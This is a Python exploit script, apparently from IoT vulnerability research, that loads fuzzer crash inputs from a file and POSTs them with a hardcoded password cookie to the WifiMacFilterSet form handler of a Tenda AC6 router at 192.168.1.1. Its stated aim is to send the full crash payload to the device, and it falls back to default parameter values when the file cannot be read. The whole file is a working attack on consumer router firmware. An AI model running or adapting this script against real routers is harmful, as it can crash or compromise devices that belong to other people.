import requests

def send_payload(url, params_dict):
    cookie={'password':'gfytgb'}
    response = requests.post(url, cookies=cookie, data=params_dict)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

def read_crash_seed_params(filename):
    """从crash_seed.bin中读取各个参数"""
    try:
        with open(filename, 'rb') as f:
            content = f.read()
        
        params = {}
        
        # 查找wifi_chkHz
        wifi_start = content.find(b'wifi_chkHz=')
        if wifi_start != -1:
            wifi_start += len(b'wifi_chkHz=')
            wifi_end = content.find(b'\n', wifi_start)
            params['wifi_chkHz'] = content[wifi_start:wifi_end]
        
        # 查找ssid_index
        ssid_start = content.find(b'ssid_index=')
        if ssid_start != -1:
            ssid_start += len(b'ssid_index=')
            ssid_end = content.find(b'\n', ssid_start)
            params['ssid_index'] = content[ssid_start:ssid_end]
        
        # 查找filter_mode
        filter_mode_start = content.find(b'filter_mode=')
        if filter_mode_start != -1:
            filter_mode_start += len(b'filter_mode=')
            filter_mode_end = content.find(b'\nfilter_list=', filter_mode_start)
            if filter_mode_end == -1:
                filter_mode_end = len(content)
            params['filter_mode'] = content[filter_mode_start:filter_mode_end]
        
        # 查找filter_list
        filter_list_start = content.find(b'filter_list=')
        if filter_list_start != -1:
            filter_list_start += len(b'filter_list=')
            params['filter_list'] = content[filter_list_start:]
        
        return params
    except Exception as e:
        print(f"读取文件错误: {e}")
        return {}

# 读取crash_seed.bin文件
crash_seed_file = '/root/IoT_vuln/tenda/AC6/AC6V2.0RTL_V15.03.06.23/formWifiMacFilterSet/crash_seed.bin'
crash_params = read_crash_seed_params(crash_seed_file)

url = "http://192.168.1.1/goform/WifiMacFilterSet"

# 显示读取到的参数信息
print("=== 从crash_seed.bin读取的参数 ===")
for key, value in crash_params.items():
    print(f"{key}: {len(value)} bytes")
    # 显示前50字节的hex
    hex_preview = value[:50].hex() if len(value) > 50 else value.hex()
    print(f"  Hex preview: {hex_preview}")

print("\n=== 发送完整payload ===")
if crash_params:
    send_payload(url, crash_params)
else:
    print("未能读取到参数，使用默认值")
    default_params = {
        'wifi_chkHz': b'10I0',
        'ssid_index': b'1',
        'filter_mode': b'1',
        'filter_list': b'aaa'
    }
    send_payload(url, default_params)